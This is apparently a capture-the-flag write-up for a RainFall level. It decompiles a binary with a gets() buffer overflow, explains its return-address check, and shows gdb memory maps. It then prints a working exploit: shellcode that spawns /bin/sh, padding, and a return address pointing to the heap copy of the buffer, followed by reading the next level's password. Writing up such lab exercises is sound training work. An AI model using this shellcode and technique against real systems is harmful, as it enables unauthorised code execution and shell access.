## Step 1: Static & Dynamic Analysis

```c
void p(void)
{
  uint unaff_retaddr;
  char buffer [76];
  
  fflush(stdout);
  gets(buffer);
  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",unaff_retaddr);
    _exit(1);
  }
  puts(buffer);
  strdup(buffer);
  return;
}

void main(void)
{
  p();
  return;
}
```

### Explanation
The binary fills a buffer (`buffer`) via `stdin` using `gets()`, without any validation to prevent potential `buffer overflow`.
After this, it checks if the copy of the `eip` (`unaff_retaddr`) on the `stack` has been modified to point to an address starting with `0xb`. If so, it calls `_exit()`.

The program checks this because it typically indicates an attempt to execute code in restricted memory regions, such as the stack or shared libraries.

If the check passes, it prints the buffer using `puts()` and creates a copy of the buffer on the `heap` using `strdup()`.
```
(gdb) info proc map                
process 3548
Mapped address spaces:

        Start Addr   End Addr       Size     Offset objfile
         0x8048000  0x8049000     0x1000        0x0 /home/user/level2/level2
         0x8049000  0x804a000     0x1000        0x0 /home/user/level2/level2
         0x804a000  0x806b000    0x21000        0x0 [heap]
        0xb7e2b000 0xb7e2c000     0x1000        0x0 
        0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
        0xb7fd2000 0xb7fd5000     0x3000        0x0 
        0xb7fd9000 0xb7fdd000     0x4000        0x0 
        0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
        0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
        0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
        0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
        0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```
To exploit the `buffer overflow`, the goal is to fill the buffer with `shellcode`, add padding to reach the `eip` copy, and overwrite it with the address of the shellcode's location in the `heap` before `strdup()` stores the buffer.
When the `p()` function returns, the overwritten `eip` will cause execution to jump to the shellcode, spawning a shell.


## Step 2: Exploiting the Binary
```
level2@RainFall:~$ python -c 'print("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("A" * 48) + "BBBB" + "\x08\x04\xa0\x08"[::-1])' > /tmp/exploit

level2@RainFall:~$ cat /tmp/exploit - | ./level2

% cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
